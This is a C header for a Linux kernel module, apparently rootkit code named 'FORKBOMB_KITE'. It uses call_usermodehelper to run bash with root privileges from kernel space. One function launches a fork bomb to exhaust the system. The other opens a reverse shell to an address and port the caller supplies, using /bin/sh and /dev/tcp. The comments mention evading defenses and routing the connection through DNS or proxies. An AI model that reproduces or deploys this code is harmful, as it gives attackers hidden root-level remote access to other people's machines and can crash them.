#ifndef FORKBOMB_KITE
    #define FORKBOMB_KITE
    #include <linux/slab.h>
    #include <linux/umh.h>

/*use bash binary to do a command that defines a function that calls itself,
  pipe the output to another call of itself, making a recursive function that calls itself
  and creating a fork each time with the pipe operator*/
static char *args[] = {"/bin/bash", "-c", ":(){ :|:& };:", NULL};
static char *env[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL}; // environment variables of the process

static char *args_shell[] = {"/bin/bash", "-c", "", NULL};

/*It runs a user-space application. The application is started asynchronously if wait is not set,
  and runs as a child of system workqueues(kworkers, executors of kthreads) that are children of kthreadd. (ie. it runs with full root capabilities and optimized affinity).
  the kthreadd enumerates other kernel threads; it provides interface routines through which other kernel threads can be dynamically spawned at runtime by kernel services.
  can also spawn multiple processes for multiple workers for added complexity to avoid defenses.
  */
static void start_bombing_run(void){
    int ret = call_usermodehelper(args[0], args, env, UMH_WAIT_PROC);
    if (ret != 0){
	      printk(KERN_ERR "error in call to usermodehelper: %i\n", ret);
    }
	  else {
	    printk(KERN_INFO "Target Aquired\n");
	  }
}

/*calling a usermode helper, using the bash binary,
  call a reverse shell on selected address and port, can change to user input or dns or proxy...
  can check for listener to not open connection for nothing
*/
static void start_reverse_shell(char *address, char *port){
    char *add = kmalloc(NAME_MAX + 1, GFP_KERNEL);
    int ret;
    snprintf(add, NAME_MAX, "/bin/sh -i >& /dev/tcp/%s/%s 0>&1", address, port);
    args_shell[2] = add;
    ret = call_usermodehelper(args_shell[0], args_shell, env, UMH_WAIT_EXEC);
    if (ret != 0){
	      printk(KERN_ERR "error in call to usermodehelper: %i\n", ret);
    }
	  else {
	      printk(KERN_INFO "RS activated\n");
    }
    kfree(add);
}
#endif